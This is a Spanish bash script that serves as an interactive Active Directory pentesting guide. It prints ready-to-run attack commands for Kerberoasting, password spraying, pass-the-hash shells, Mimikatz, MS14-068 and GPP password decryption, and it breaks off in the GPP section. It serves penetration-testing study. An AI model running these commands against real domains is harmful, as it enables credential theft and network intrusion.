#!/bin/bash

# Active Directory Pentesting Interactive Guide - Versión Completa y Mejorada
# Guía informativa - No ejecuta comandos automáticamente

# Colores para la interfaz
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

# Configuración global
DOMAIN="lab.local"
DC_IP="192.168.1.10"
USERNAME=""
PASSWORD=""
NTLM_HASH=""
TARGET_IP="192.168.1.20"

# Función para mostrar el banner
show_banner() {
    clear
    echo -e "${BLUE}"
    echo "===================================================================================="
    echo "|                         PENTESTING EN ACTIVE DIRECTORY                           |"
    echo "|                         Manual de Comandos y Técnicas                            |"
    echo "===================================================================================="
    echo "===================================================================="
    echo "Descripción:# Network Pivoting & Discovery"                                                       
    echo "Guía completa de técnicas de pivoting y descubrimiento de redes"				    
    echo "Autor: Oliver - github: https://github.com/oliverexx"						    
    echo "github: https://github.com/oliverexx"								   
    echo "Linkedin: www.linkedin.com/in/axel-tear"							   
    echo "Fecha: 2025"  										    
    echo "===================================================================="
    echo -e "${NC}"
    echo -e "${YELLOW}Domain:${NC} $DOMAIN"
    echo -e "${YELLOW}Domain Controller:${NC} $DC_IP"
    echo -e "${YELLOW}Usuario:${NC} $USERNAME"

    echo
}
# Función para pausa y continuar
press_enter() {
    echo
    echo -e "${YELLOW}Presiona Enter para continuar...${NC}"
    read
}

# Función para mostrar comandos
show_command() {
    local command=$1
    local description=$2
    
    echo -e "${GREEN}Descripción:${NC} $description"
    echo -e "${CYAN}Comando:${NC}"
    echo -e "${YELLOW}$command${NC}"
    echo
}

# Función principal
main_menu() {
    while true; do
        show_banner
        echo -e "${GREEN}Menú Principal:${NC}"
        echo "1. Reconocimiento y Enumeración"
        echo "2. Escalada de Privilegios y Credenciales"
        echo "3. Movimiento Lateral"
        echo "4. Persistencia"
        echo "5. Extracción de Datos"
        echo "6. Herramientas y Comandos Útiles"
        echo "7. Técnicas de Evasión"
        echo "8. Ataques de Exchange"
        echo "9. Ataques de Relaying"
        echo "10. Herramientas de Assessment"
        echo "11. Métodos de Ejecución y Descarga"
        echo "12. Herramientas de Comando y Control"
        echo "13. Configuración de Entorno"
        echo "0. Salir"
        echo
        read -p "Selecciona una opción [0-13]: " option
        
        case $option in
            1) recon_menu ;;
            2) privilege_menu ;;
            3) lateral_menu ;;
            4) persistence_menu ;;
            5) data_exfiltration_menu ;;
            6) tools_menu ;;
            7) evasion_menu ;;
            8) exchange_attacks_menu ;;
            9) relaying_attacks_menu ;;
            10) assessment_tools_menu ;;
            11) execution_menu ;;
            12) c2_menu ;;
            13) config_menu ;;
            0) exit 0 ;;
            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; sleep 2 ;;
        esac
    done
}

# ==============================================
# MENÚS PRINCIPALES
# ==============================================

# Menú de Reconocimiento y Enumeración
recon_menu() {
    while true; do
        show_banner
        echo -e "${GREEN}Reconocimiento y Enumeración:${NC}"
        echo "1. Enumeración Básica de Dominio"
        echo "2. Enumeración de Usuarios"
        echo "3. Enumeración de Grupos"
        echo "4. Enumeración de Computadoras"
        echo "5. Enumeración de Políticas (GPO)"
        echo "6. Escaneo de Puertos y Servicios"
        echo "7. Búsqueda de Shares SMB (Incluye Sesión Nula)"
        echo "8. Enumeración de Relaciones de Confianza"
        echo "9. Contraseñas en Comentarios de Usuarios"
        echo "10. Volver al Menú Principal"
        echo
        read -p "Selecciona una opción [1-10]: " option

        case $option in
            1) domain_recon_info ;;
            2) user_enum_info ;;
            3) group_enum_info ;;
            4) computer_enum_info ;;
            5) policy_enum_info ;;
            6) port_scan_info ;;
            7) share_enum_info ;;
            8) trust_enum_info ;;
            9) password_in_comment_info ;;
            10) break ;;
            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
        esac
    done
}

# Menú de Escalada de Privilegios
privilege_menu() {
    while true; do
        show_banner
        echo -e "${GREEN}Escalada de Privilegios y Credenciales:${NC}"
        echo "1. Kerberoasting"
        echo "2. AS-REP Roasting"
        echo "3. Password Spraying"
        echo "4. Pass-the-Hash"
        echo "5. OverPass-the-Hash (Pass-the-Key)"
        echo "6. MS14-068"
        echo "7. Abuso de Grupos Peligrosos (AdminSDHolder)"
        echo "8. Contraseñas en Group Policy Preferences (GPP)"
        echo "9. Abuso de contraseñas LAPS"
        echo "10. Volver al Menú Principal"
        echo
        read -p "Selecciona una opción [1-10]: " option

        case $option in
            1) kerberoasting_info ;;
            2) asrep_roasting_info ;;
            3) password_spraying_info ;;
            4) pass_the_hash_info ;;
            5) over_pass_the_hash_info ;;
            6) ms14_068_info ;;
            7) dangerous_groups_info ;;
            8) gpp_passwords_info ;;
            9) laps_passwords_info ;;
            10) break ;;
            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
        esac
    done
}

# Menú de Herramientas y Comandos Útiles
tools_menu() {
    while true; do
        show_banner
        echo -e "${GREEN}Herramientas y Comandos Útiles:${NC}"
        echo "1. Impacket Suite"
        echo "2. CrackMapExec"
        echo "3. Kerbrute"
        echo "4. Mimikatz"
        echo "5. Rubeus"
        echo "6. PowerSploit"
        echo "7. Volver al Menú Principal"
        echo
        read -p "Selecciona una opción [1-7]: " option

        case $option in
            1) impacket_tools_info ;;
            2) crackmapexec_info ;;
            3) kerbrute_info ;;
            4) mimikatz_info ;;
            5) rubeus_info ;;
            6) powersploit_info ;;
            7) break ;;
            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
        esac
    done
}

# Menú de Movimiento Lateral
lateral_menu() {
    while true; do
        show_banner
        echo -e "${GREEN}Movimiento Lateral:${NC}"
        echo "1. WMI Execution"
        echo "2. PSRemoting / WinRM"
        echo "3. Scheduled Tasks (at/schtasks)"
        echo "4. Creación de Servicios (sc)"
        echo "5. Pass-the-Hash"
        echo "6. Pass-the-Ticket (Golden/Silver/Trust)"
        echo "7. Volver al Menú Principal"
        echo
        read -p "Selecciona una opción [1-7]: " option
        
        case $option in
            1) wmi_exec_info ;;
            2) psremote_info ;;
            3) scheduled_tasks_info ;;
            4) service_creation_info ;;
            5) pass_the_hash_info ;;
            6) ptt_menu ;;
            7) break ;;
            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
        esac
    done
}

# Sub-Menú para Pass-the-Ticket
ptt_menu() {
    while true; do
        show_banner
        echo -e "${GREEN}Pass-the-Ticket:${NC}"
        echo "1. Golden Ticket"
        echo "2. Silver Ticket"
        echo "3. Trust Ticket (Abuso de Confianzas)"
        echo "4. Volver al menú de Movimiento Lateral"
        echo
        read -p "Selecciona una opción [1-4]: " option
        
        case $option in
            1) golden_ticket_info ;;
            2) silver_ticket_info ;;
            3) trust_tickets_info ;;
            4) break ;;
            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
        esac
    done
}


# Menú de Persistencia
persistence_menu() {
    while true; do
        show_banner
        echo -e "${GREEN}Persistencia:${NC}"
        echo "1. Golden Ticket"
        echo "2. Silver Ticket"
        echo "3. DSRM Password"
        echo "4. Skeleton Key"
        echo "5. AdminSDHolder"
        echo "6. Volver al Menú Principal"
        echo
        read -p "Selecciona una opción [1-6]: " option
        
        case $option in
            1) golden_ticket_info ;;
            2) silver_ticket_info ;;
            3) dsrm_password_info ;;
            4) skeleton_key_info ;;
            5) dangerous_groups_info ;;
            6) break ;;
            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
        esac
    done
}

# Menú de Extracción de Datos
data_exfiltration_menu() {
    while true; do
        show_banner
        echo -e "${GREEN}Extracción de Datos:${NC}"
        echo "1. NTDS.dit Extraction"
        echo "2. Group Policy Preferences (GPP)"
        echo "3. LAPS Passwords"
        echo "4. Volume Shadow Copy (VSS)"
        echo "5. Volver al Menú Principal"
        echo
        read -p "Selecciona una opción [1-5]: " option
        
        case $option in
            1) ntds_extraction_info ;;
            2) gpp_passwords_info ;;
            3) laps_passwords_info ;;
            4) shadow_copy_info ;;
            5) break ;;
            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
        esac
    done
}

# Menú de Técnicas de Evasión
evasion_menu() {
    while true; do
        show_banner
        echo -e "${GREEN}Técnicas de Evasión:${NC}"
        echo "1. Ofuscación de Scripts (PowerShell)"
        echo "2. AMSI Bypass"
        echo "3. AppLocker Bypass"
        echo "4. Constrained Language Mode Bypass"
        echo "5. Volver al Menú Principal"
        echo
        read -p "Selecciona una opción [1-5]: " option
        
        case $option in
            1) obfuscation_info ;;
            2) amsi_bypass_info ;;
            3) applocker_bypass_info ;;
            4) constrained_language_info ;;
            5) break ;;
            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
        esac
    done
}

# Menú de Ataques de Exchange
exchange_attacks_menu() {
    while true; do
        show_banner
        echo -e "${GREEN}Ataques de Exchange:${NC}"
        echo "1. PrivExchange Attack"
        echo "2. CVE-2020-0688"
        echo "3. CVE-2018-8581"
        echo "4. Enumeración de Exchange"
        echo "5. Volver al Menú Principal"
        echo
        read -p "Selecciona una opción [1-5]: " option
        
        case $option in
            1) privexchange_attack_info ;;
            2) cve_2020_0688_info ;;
            3) cve_2018_8581_info ;;
            4) exchange_enum_info ;;
            5) break ;;
            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
        esac
    done
}

# Menú de Ataques de Relaying
relaying_attacks_menu() {
    while true; do
        show_banner
        echo -e "${GREEN}Ataques de Relaying:${NC}"
        echo "1. NTLMv2 Relaying (General)"
        echo "2. Mitm6 + ntlmrelayx (IPv6)"
        echo "3. Configuración de Responder"
        echo "4. Relay a LDAP/S"
        echo "5. Relay a SMB (con SMB signing deshabilitado)"
        echo "6. Volver al Menú Principal"
        echo
        read -p "Selecciona una opción [1-6]: " option
        
        case $option in
            1) ntlm_relaying_info ;;
            2) mitm6_relay_info ;;
            3) responder_config_info ;;
            4) ldap_relay_info ;;
            5) smb_relay_info ;;
            6) break ;;
            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
        esac
    done
}

# Menú de Herramientas de Assessment
assessment_tools_menu() {
    while true; do
        show_banner
        echo -e "${GREEN}Herramientas de Assessment:${NC}"
        echo "1. Ping Castle"
        echo "2. BloodHound"
        echo "3. ADAPE Script"
        echo "4. Ranger"
        echo "5. AdExplorer (Sysinternals)"
        echo "6. PowerSploit"
        echo "7. Volver al Menú Principal"
        echo
        read -p "Selecciona una opción [1-7]: " option
        
        case $option in
            1) pingcastle_info ;;
            2) bloodhound_info ;;
            3) adape_script_info ;;
            4) ranger_info ;;
            5) adexplorer_info ;;
            6) powersploit_info ;;
            7) break ;;
            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
        esac
    done
}

# Menú de Métodos de Ejecución y Descarga
execution_menu() {
    while true; do
        show_banner
        echo -e "${GREEN}Métodos de Ejecución y Descarga:${NC}"
        echo "1. Descarga y Ejecución desde Web"
        echo "2. Ejecución con PowerShell"
        echo "3. Ejecución con Binarios de Windows"
        echo "4. Técnicas de Ofuscación"
        echo "5. Volver al Menú Principal"
        echo
        read -p "Selecciona una opción [1-5]: " option
        
        case $option in
            1) web_execution_info ;;
            2) powershell_execution_info ;;
            3) windows_binaries_info ;;
            4) obfuscation_techniques_info ;;
            5) break ;;
            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
        esac
    done
}

# Menú de Comando y Control
c2_menu() {
    while true; do
        show_banner
        echo -e "${GREEN}Herramientas de Comando y Control (C2):${NC}"
        echo "1. Koadic C3"
        echo "2. Covenant"
        echo "3. Sliver"
        echo "4. Metasploit"
        echo "5. Cobalt Strike"
        echo "6. Volver al Menú Principal"
        echo
        read -p "Selecciona una opción [1-6]: " option
        
        case $option in
            1) koadic_info ;;
            2) covenant_info ;;
            3) sliver_info ;;
            4) metasploit_info ;;
            5) cobalt_strike_info ;;
            6) break ;;
            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
        esac
    done
}

# Menú de Configuración de Entorno
config_menu() {
    while true; do
        show_banner
        echo -e "${GREEN}Configuración de Entorno:${NC}"
        echo "1. Configurar Dominio"
        echo "2. Configurar DC IP"
        echo "3. Configurar Usuario"
        echo "4. Configurar Contraseña"
        echo "5. Configurar Hash NTLM"
        echo "6. Configurar IP Objetivo"
        echo "7. Volver al Menú Principal"
        echo
        read -p "Selecciona una opción [1-7]: " option
        
        case $option in
            1) read -p "Nuevo dominio: " DOMAIN; echo -e "${GREEN}Dominio configurado a: $DOMAIN${NC}"; sleep 2 ;;
            2) read -p "Nueva IP del DC: " DC_IP; echo -e "${GREEN}DC IP configurado a: $DC_IP${NC}"; sleep 2 ;;
            3) read -p "Nuevo usuario: " USERNAME; echo -e "${GREEN}Usuario configurado a: $USERNAME${NC}"; sleep 2 ;;
            4) read -s -p "Nueva contraseña: " PASSWORD; echo -e "${GREEN}\nContraseña configurada${NC}"; sleep 2 ;;
            5) read -s -p "Nuevo hash NTLM: " NTLM_HASH; echo -e "${GREEN}\nHash NTLM configurado${NC}"; sleep 2 ;;
            6) read -p "Nueva IP objetivo: " TARGET_IP; echo -e "${GREEN}IP objetivo configurado a: $TARGET_IP${NC}"; sleep 2 ;;
            7) break ;;
            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; sleep 2 ;;
        esac
    done
}


# ==============================================
# INFORMACIÓN SOBRE TÉCNICAS (FUNCIONES INFO)
# ==============================================

# --- Reconocimiento y Enumeración ---

domain_recon_info() {
    show_banner
    echo -e "${GREEN}Enumeración Básica de Dominio:${NC}"
    echo
    show_command "net view /domain" "Listar dominios en la red"
    show_command "net view /domain:$DOMAIN" "Listar computadoras en el dominio"
    show_command "nltest /dclist:$DOMAIN" "Listar todos los Domain Controllers"
    echo -e "${MAGENTA}Objetivo:${NC} Obtener información básica sobre el dominio, su estructura y sus controladores."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Comandos nativos de Windows, PowerView, BloodHound."
    echo -e "${MAGENTA}Notas:${NC} Este es siempre el primer paso. Identificar los DCs es crucial ya que son los objetivos de mayor valor."
    press_enter
}

user_enum_info() {
    show_banner
    echo -e "${GREEN}Enumeración de Usuarios:${NC}"
    echo
    show_command "net user /domain" "Listar todos los usuarios del dominio"
    show_command "net user $USERNAME /domain" "Información detallada de un usuario específico"
    show_command "Get-ADUser -Filter * -Properties * | Select-Object Name,Enabled,LastLogonDate" "Enumerar usuarios con PowerShell y filtrar por actividad"
    echo -e "${MAGENTA}Objetivo:${NC} Identificar usuarios, sus propiedades and estado (activo/inactivo)."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Comandos nativos, PowerView, ldapsearch, BloodHound."
    echo -e "${MAGENTA}Notas:${NC} Busca usuarios con descripciones interesantes, cuentas de servicio (svc_), cuentas que no expiran o que no han iniciado sesión en mucho tiempo."
    press_enter
}

group_enum_info() {
    show_banner
    echo -e "${GREEN}Enumeración de Grupos:${NC}"
    echo
    show_command "net group /domain" "Listar todos los grupos del dominio"
    show_command "net group \"Domain Admins\" /domain" "Listar miembros del grupo 'Domain Admins'"
    show_command "Get-ADGroupMember -Identity \"Enterprise Admins\"" "Listar miembros de 'Enterprise Admins' con PowerShell"
    echo -e "${MAGENTA}Objetivo:${NC} Identificar grupos de seguridad y sus miembros, con especial atención a los grupos privilegiados."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Comandos nativos, PowerView, BloodHound."
    echo -e "${MAGENTA}Notas:${NC} Presta atención a grupos como 'Domain Admins', 'Enterprise Admins', 'Schema Admins', y también a otros menos obvios como 'Backup Operators' o 'Account Operators'."
    press_enter
}

computer_enum_info() {
    show_banner
    echo -e "${GREEN}Enumeración de Computadoras:${NC}"
    echo
    show_command "net view" "Listar computadoras en la red (puede ser impreciso)"
    show_command "Get-ADComputer -Filter * -Properties OperatingSystem | Select-Object Name,OperatingSystem" "Enumerar computadoras y su SO con PowerShell"
    show_command "nmap -p 445 --open 192.168.1.0/24" "Escanear la red en busca de hosts con el puerto SMB abierto"
    echo -e "${MAGENTA}Objetivo:${NC} Identificar sistemas (servidores, estaciones de trabajo) en el dominio."
    echo -e "${MAGENTA}Herramientas útiles:${NC} PowerView, nmap, crackmapexec."
    echo -e "${MAGENTA}Notas:${NC} Busca sistemas con sistemas operativos antiguos y sin parches, ya que son objetivos fáciles. Los nombres de los equipos a menudo revelan su función (e.g., 'SRV-SQL', 'DC01')."
    press_enter
}

policy_enum_info() {
    show_banner
    echo -e "${GREEN}Enumeración de Políticas (GPO):${NC}"
    echo
    show_command "gpresult /R" "Mostrar las políticas de grupo aplicadas al usuario y equipo actual"
    show_command "Get-GPO -All" "Listar todas las GPOs del dominio con PowerShell"
    show_command "findstr /S /I cpassword \\\\$DOMAIN\\SYSVOL\\$DOMAIN\\policies\\*.xml" "Buscar contraseñas antiguas de GPP en SYSVOL"
    echo -e "${MAGENTA}Objetivo:${NC} Identificar políticas de grupo (GPOs) y buscar configuraciones inseguras o credenciales."
    echo -e "${MAGENTA}Herramientas útiles:${NC} gpresult, PowerView, GPMC."
    echo -e "${MAGENTA}Notas:${NC} Las GPOs pueden revelar configuraciones de seguridad, scripts de inicio de sesión, mapeo de unidades y, en casos antiguos, contraseñas cifradas (vulnerabilidad GPP)."
    press_enter
}

port_scan_info() {
    show_banner
    echo -e "${GREEN}Escaneo de Puertos y Servicios:${NC}"
    echo
    show_command "nmap -sS -sV -O $TARGET_IP" "Escaneo TCP SYN, detección de versiones and SO"
    show_command "nmap -p 53,88,135,139,389,445,636,3268,3269,5985 $DC_IP" "Escaneo de puertos críticos de AD en un DC"
    show_command "crackmapexec smb $TARGET_IP/24" "Enumerar información SMB en un rango de IPs"
    echo -e "${MAGENTA}Objetivo:${NC} Identificar servicios y puertos abiertos en los sistemas para encontrar vectores de ataque."
    echo -e "${MAGENTA}Herramientas útiles:${NC} nmap, masscan, crackmapexec."
    echo -e "${MAGENTA}Notas:${NC} Puertos clave en AD: 88 (Kerberos), 389 (LDAP), 445 (SMB), 636 (LDAPS), 3268 (Global Catalog), 5985 (WinRM). Un puerto abierto no siempre es vulnerable, pero es un punto de entrada."
    press_enter
}

share_enum_info() {
    show_banner
    echo -e "${GREEN}Búsqueda de Shares SMB (Incluye Sesión Nula):${NC}"
    echo
    show_command "smbclient -L //$TARGET_IP -N -U \"\"" "Listar shares con sesión nula (sin credenciales)"
    show_command "smbmap -H $TARGET_IP" "Listar shares y permisos con sesión nula usando smbmap"
    show_command "crackmapexec smb $TARGET_IP/24 --shares" "Listar shares en un rango de IPs con credenciales nulas"
    show_command "smbclient -L //$TARGET_IP -U \"$USERNAME%$PASSWORD\"" "Listar shares con credenciales válidas"
    show_command "smbclient //$TARGET_IP/ShareName -c 'ls'" "Conectar a un share y listar archivos"
    echo -e "${MAGENTA}Objetivo:${NC} Encontrar recursos compartidos (shares) de red y analizar sus permisos."
    echo -e "${MAGENTA}Herramientas útiles:${NC} smbclient, smbmap, crackmapexec, PowerView."
    echo -e "${MAGENTA}Notas:${NC} La sesión nula permite enumerar shares sin autenticación. Busca siempre shares como SYSVOL y NETLOGON en los DCs, ya que pueden contener scripts de logon o GPOs. Un share con permisos de escritura para 'Everyone' es un gran hallazgo."
    press_enter
}

trust_enum_info() {
    show_banner
    echo -e "${GREEN}Enumeración de Relaciones de Confianza:${NC}"
    echo
    show_command "nltest /domain_trusts" "Listar relaciones de confianza del dominio actual"
    show_command "Get-ADTrust -Filter *" "Listar confianzas con PowerShell"
    show_command "bloodhound-python -c DCOnly -d $DOMAIN -u $USERNAME -p '$PASSWORD' -ns $DC_IP" "BloodHound puede mapear confianzas visualmente"
    echo -e "${MAGENTA}Objetivo:${NC} Identificar relaciones de confianza (trusts) con otros dominios para posibles rutas de movimiento lateral."
    echo -e "${MAGENTA}Herramientas útiles:${NC} nltest, PowerShell (Get-ADTrust), BloodHound."
    echo -e "${MAGENTA}Notas:${NC} Las confianzas bidireccionales son particularmente interesantes. Una confianza puede permitir a un usuario de un dominio acceder a recursos de otro, abriendo nuevas vías de ataque."
    press_enter
}

password_in_comment_info() {
    show_banner
    echo -e "${GREEN}Contraseñas en Comentarios/Descripciones de AD:${NC}"
    echo
    show_command "Get-ADUser -Filter 'description -like \"*pass*\"' -Properties description | select name,description" "Buscar 'pass' en descripciones de usuarios con PowerShell"
    show_command "ldapsearch -x -h $DC_IP -b \"dc=${DOMAIN//./,dc=}\" \"(objectClass=user)\" description | grep -i pass" "Buscar vía LDAP"
    echo -e "${MAGENTA}Objetivo:${NC} Encontrar credenciales almacenadas accidentalmente en texto claro en campos de metadatos de AD."
    echo -e "${MAGENTA}Herramientas útiles:${NC} PowerShell, ldapsearch, BloodHound (puede buscar propiedades personalizadas)."
    echo -e "${MAGENTA}Notas:${NC} Es una mala práctica sorprendentemente común. Busca variaciones como 'contraseña', 'clave', 'pwd', 'password', etc. A veces, los administradores dejan notas aquí para recordar contraseñas de servicio."
    press_enter
}

# --- Escalada de Privilegios y Credenciales ---

kerberoasting_info() {
    show_banner
    echo -e "${GREEN}Kerberoasting:${NC}"
    echo
    show_command "GetUserSPNs.py -request -dc-ip $DC_IP $DOMAIN/$USERNAME" "Solicitar TGS para cuentas de servicio con Impacket"
    show_command "Rubeus.exe kerberoast /outfile:hashes.txt" "Realizar Kerberoasting desde una máquina Windows con Rubeus"
    show_command "Invoke-Kerberoast -OutputFormat Hashcat | select hash | Out-File -filepath hashes.txt" "Usar PowerSploit y guardar en formato Hashcat"
    show_command "hashcat -m 13100 -a 0 hashes.txt /path/to/wordlist.txt" "Crackear el hash TGS obtenido con Hashcat"
    echo -e "${MAGENTA}Objetivo:${NC} Obtener el hash de la contraseña de una cuenta de servicio para crackearlo offline."
    echo -e "${MAGENTA}Requisitos:${NC} Credenciales de cualquier usuario de dominio válido."
    echo -e "${MAGENTA}Herramientas útiles:${NC} GetUserSPNs.py, Rubeus, PowerSploit, Hashcat, John the Ripper."
    echo -e "${MAGENTA}Notas:${NC} Este ataque es muy sigiloso porque simula un comportamiento legítimo. Se abusa de cuentas de servicio (con SPN) porque suelen tener contraseñas débiles que no rotan y, a veces, privilegios elevados."
    press_enter
}

asrep_roasting_info() {
    show_banner
    echo -e "${GREEN}AS-REP Roasting:${NC}"
    echo
    show_command "GetNPUsers.py $DOMAIN/ -usersfile users.txt -format hashcat -outputfile hashes.txt" "AS-REP Roasting con Impacket"
    show_command "Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt" "AS-REP Roasting con Rubeus"
    show_command "hashcat -m 18200 -a 0 hashes.txt /path/to/wordlist.txt" "Crackear el hash AS-REP con Hashcat"
    echo -e "${MAGENTA}Objetivo:${NC} Obtener el hash de la contraseña de usuarios que no requieren pre-autenticación de Kerberos."
    echo -e "${MAGENTA}Requisitos:${NC} No se requieren credenciales, solo una lista de usuarios y conexión al DC."
    echo -e "${MAGENTA}Herramientas útiles:${NC} GetNPUsers.py, Rubeus, Hashcat."
    echo -e "${MAGENTA}Notas:${NC} La pre-autenticación es una medida de seguridad. Si está deshabilitada para un usuario, cualquiera puede solicitar parte del TGT y crackearlo offline. Es una configuración insegura que se debe buscar activamente."
    press_enter
}

password_spraying_info() {
    show_banner
    echo -e "${GREEN}Password Spraying:${NC}"
    echo
    show_command "kerbrute passwordspray -d $DOMAIN --dc $DC_IP users.txt 'Summer2025!'" "Password spraying contra Kerberos con kerbrute"
    show_command "crackmapexec smb $TARGET_IP/24 -u users.txt -p 'Welcome1' --continue-on-success" "Password spraying contra SMB en un rango de IPs"
    show_command "DomainPasswordSpray.ps1 -UserList users.txt -Domain $DOMAIN -PasswordList passlist.txt" "Password spraying con PowerShell"
    echo -e "${MAGENTA}Objetivo:${NC} Probar una o pocas contraseñas comunes contra una gran lista de usuarios para encontrar una cuenta válida."
    echo -e "${MAGENTA}Requisitos:${NC} Una lista de nombres de usuario válidos."
    echo -e "${MAGENTA}Herramientas útiles:${NC} kerbrute, CrackMapExec, DomainPasswordSpray.ps1."
    echo -e "${MAGENTA}Notas:${NC} Esta técnica es más sigilosa que la fuerza bruta tradicional porque evita los bloqueos de cuenta. Contraseñas comunes a probar son 'Password1', 'Welcome1', 'Summer2025', 'Fall2025', o el nombre de la empresa seguido de un número y un símbolo. La cuenta 'Administrator' (RID 500) no se puede bloquear."
    press_enter
}

pass_the_hash_info() {
    show_banner
    echo -e "${GREEN}Pass-the-Hash (PtH):${NC}"
    echo
    show_command "psexec.py -hashes :$NTLM_HASH $DOMAIN/$USERNAME@$TARGET_IP" "Obtener una shell remota con PtH usando psexec.py"
    show_command "wmiexec.py -hashes :$NTLM_HASH $DOMAIN/$USERNAME@$TARGET_IP" "Ejecutar comandos vía WMI con PtH"
    show_command "crackmapexec smb $TARGET_IP/24 -u $USERNAME -H $NTLM_HASH --local-auth" "Validar un hash en múltiples equipos y ejecutar comandos"
    show_command "sekurlsa::pth /user:Admin /domain:$DOMAIN /ntlm:$NTLM_HASH /run:cmd.exe" "Iniciar un proceso con el hash inyectado usando Mimikatz (crea una nueva ventana de cmd)"
    echo -e "${MAGENTA}Objetivo:${NC} Autenticarse en sistemas remotos usando el hash NTLM de un usuario en lugar de su contraseña en texto claro."
    echo -e "${MAGENTA}Requisitos:${NC} Hash NTLM de un usuario y que este tenga privilegios de administrador local en el equipo destino."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Impacket (psexec, wmiexec), crackmapexec, mimikatz."
    echo -e "${MAGENTA}Notas:${NC} Técnica fundamental para el movimiento lateral. El hash LM suele estar en blanco (aad3b435b51404eeaad3b435b51404ee), por lo que a menudo se pasa como ':NTHASH'."
    press_enter
}

over_pass_the_hash_info() {
    show_banner
    echo -e "${GREEN}OverPass-the-Hash (Pass-the-Key):${NC}"
    echo
    show_command "sekurlsa::pth /user:$USERNAME /domain:$DOMAIN /ntlm:$NTLM_HASH /run:\"mstsc.exe /restrictedadmin\"" "Lanzar RDP con Restricted Admin Mode usando Mimikatz y PtH"
    show_command "getTGT.py -hashes :$NTLM_HASH $DOMAIN/$USERNAME" "Solicitar un TGT de Kerberos usando solo el hash NTLM (Impacket)"
    show_command "export KRB5CCNAME=ticket.ccache" "Establecer el ticket TGT obtenido como variable de entorno"
    show_command "psexec.py -k -no-pass $DOMAIN/$USERNAME@$TARGET_IP" "Usar el ticket Kerberos para autenticarse (Pass-the-Ticket)"
    echo -e "${MAGENTA}Objetivo:${NC} Superar las limitaciones de NTLM utilizando un hash NTLM para obtener un ticket de Kerberos y así interactuar con servicios que lo requieran."
    echo -e "${MAGENTA}Requisitos:${NC} Hash NTLM de un usuario."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Mimikatz, Impacket (getTGT.py)."
    echo -e "${MAGENTA}Notas:${NC} Muy útil en redes donde se ha deshabilitado la autenticación NTLM o para evadir ciertas monitorizaciones. Es una evolución de Pass-the-Hash que se adapta a entornos más modernos y seguros."
    press_enter
}

ms14_068_info() {
    show_banner
    echo -e "${GREEN}MS14-068 - Vulnerabilidad de Elevación de Privilegios Kerberos:${NC}"
    echo
    show_command "rpcclient -U \"\" $DC_IP -c 'lookupnames $USERNAME'" "Obtener el SID de un usuario remotamente"
    show_command "wmic useraccount get name,sid" "Obtener SIDs localmente si tienes acceso a una máquina"
    show_command "python ms14-068.py -u $USERNAME@$DOMAIN -p '$PASSWORD' -s USER_SID -d $DC_IP" "Generar ticket Kerberos con PyKEK"
    show_command "mimikatz.exe \"kerberos::ptc TICKET.ccache\"" "Inyectar el ticket en memoria con Mimikatz"
    echo -e "${MAGENTA}Objetivo:${NC} Elevar privilegios de un usuario de dominio estándar a Administrador de Dominio."
    echo -e "${MAGENTA}Requisitos:${NC} Credenciales de un usuario de dominio, su SID y un DC vulnerable (sin el parche KB3011780)."
    echo -e "${MAGENTA}Herramientas útiles:${NC} ms14-068.py (PyKEK), mimikatz, rpcclient."
    echo -e "${MAGENTA}Notas:${NC} Es una vulnerabilidad antigua (2014) pero efectiva en entornos sin parches. ¡Cuidado! El ataque puede fallar si existe un desfase de tiempo (clock skew) entre tu máquina y el DC. Usa 'nmap -p 88 --script krb5-enum-users' o herramientas similares para verificar la hora."
    press_enter
}

dangerous_groups_info() {
    show_banner
    echo -e "${GREEN}Abuso de Grupos Peligrosos y AdminSDHolder:${NC}"
    echo
    show_command "net group \"Backup Operators\" /domain" "Enumerar miembros de grupos peligrosos pero no obvios"
    show_command "Get-ADUser -LDAPFilter \"(objectcategory=person)(samaccountname=*)(admincount=1)\"" "Encontrar usuarios protegidos por el mecanismo AdminSDHolder"
    echo -e "${MAGENTA}Objetivo:${NC} Identificar y abusar de los privilegios de grupos que, aunque no son 'Domain Admins', tienen permisos críticos. Identificar cuentas privilegiadas persistentes."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Comandos nativos, PowerShell, BloodHound."
    echo -e "${MAGENTA}Notas:${NC} AdminSDHolder es un mecanismo que aplica una ACL estricta a cuentas privilegiadas para protegerlas. Identificar estas cuentas (admincount=1) te dice quiénes son o han sido miembros de grupos privilegiados. Grupos como 'Backup Operators' pueden leer cualquier archivo en un DC, incluyendo NTDS.dit."
    press_enter
}

gpp_passwords_info() {
    show_banner
    echo -e "${GREEN}Group Policy Preferences (GPP) Passwords:${NC}"
    echo
    show_command "findstr /S /I cpassword \\\\$DOMAIN\\sysvol\\$DOMAIN\\policies\\*.xml" "Buscar archivos XML con el campo 'cpassword'"
    show_command "Get-GPPPassword" "Extraer y descifrar contraseñas GPP con PowerSploit"
    show_command "gpp-decrypt DECRYPT_THIS_STRING" "Descifrar la contraseña manualmente (la clave AES es pública)"
